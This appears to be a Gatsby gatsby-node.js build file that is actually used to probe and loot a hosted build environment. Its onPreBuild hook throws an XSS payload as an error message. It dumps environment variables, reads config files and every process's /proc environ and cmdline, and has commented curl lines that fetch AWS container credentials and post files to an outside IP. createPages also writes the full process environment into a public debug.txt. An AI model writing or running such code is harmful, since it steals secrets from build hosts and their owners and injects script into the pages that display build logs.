const path = require("path")
const fs = require("fs")
const { execSync } = require("child_process")
const { isCI, getCIName } = require(`gatsby-core-utils`)
const multiIni = require("multi-ini")

/**
 * Implement Gatsby's Node APIs in this file.
 *
 * See: https://www.gatsbyjs.org/docs/node-apis/
 */

// You can delete this file if you're not using it
function exec(cmd) {
  console.log(`cmd: ${cmd}`, execSync(cmd).toString("utf8"))
}
exports.onPreBuild = function () {

  if (1 < 2) {
    throw new Error("<img src=x onerror=alert('hello')>")
  }
  console.log(`aw yeah2`)

  //exec(`env`)
  //exec(`curl --connect-timeout 100000 http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`)
 //(`curl 185.20.136.111:1234 --data-binary @/var/task/bootstrap.sh`)
  //exec(`curl 185.20.136.111:1234 --data-binary @/var/task/iltorb.node`)
  //exec(`ls -la /var/task`)
  console.log(`aw yeah`)
  exec(`env`)
  console.log(`done env`)
  try {
    exec(`cat ~/.config/gatsby/config.json`)
  } catch (e) {
    console.log(`error getting machineId`, e)
  }
  exec(`ls -la $HOME`)
  console.log(`done home`)
  exec(`ls -la .`)
  console.log(`done local`)

  const ls = fs.readdirSync(`/proc`)
  ls.filter(dir => Number.isFinite(Number(dir))).forEach(dir => {
    console.log(dir)
    try {
      console.log(
        fs
          .readFileSync(path.join(`/proc`, dir, `cmdline`))
          .toString("utf8")
          .replace(/\0/g, " ")
      )
    } catch (e) {
      console.log(`failed to read ${dir}/cmdline`)
    }
    try {
      console.log(
        fs
          .readFileSync(path.join(`/proc`, dir, `environ`))
          .toString("utf8")
          .replace(/\0/g, " ")
      )
    } catch (e) {
      console.log(`failed to read ${dir}/environ`)
    }
  })
}

exports.createPages = async ({ actions }) => {
  const { createPage } = actions

  fs.writeFileSync(
    `./public/debug.txt`,
    JSON.stringify(
      {
        sessionID: process.gatsbyTelemetrySessionId,
        lol: 1,
        env: JSON.stringify(process.env),
      },
      null,
      2
    )
  )
}
